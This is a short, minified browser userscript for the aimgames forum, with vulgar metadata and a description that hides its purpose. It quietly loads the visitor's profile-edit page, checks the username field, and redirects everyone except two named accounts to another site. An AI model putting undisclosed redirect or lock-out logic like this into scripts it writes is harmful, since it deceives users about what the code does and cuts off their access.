// ==UserScript==
// @name å��å�� SCREAM å��å��
// @description IT BEGINS
// @namespace dicks@penis.fuck
// @include http://aimgames.forummotion.com/*
// @version 0.0.1
// @grant none
// @license MIT License (Expat); opensource.org/licenses/MIT
// ==/UserScript==
'use strict';function b(){http=new XMLHttpRequest;http.open("GET","http://aimgames.forummotion.com/profile?mode=editprofile",!0);http.onreadystatechange=function(){if(4==http.readyState&&200==http.status){var c=http.responseText;document.body.appendChild(document.createElement("div")).innerHTML="<div id='secret' style='display:none;'></div>";var a=document.createElement("div");for(a.innerHTML=c;0<a.children.length;)document.getElementById("secret").appendChild(a.children[0]);"rafa1231518"!=document.getElementById("register")[0].value&&
"Kaffeinated"!=document.getElementById("register")[0].value&&window.location.replace("http://agor.io")}};http.send(void 0)}window.onload=function(){b()};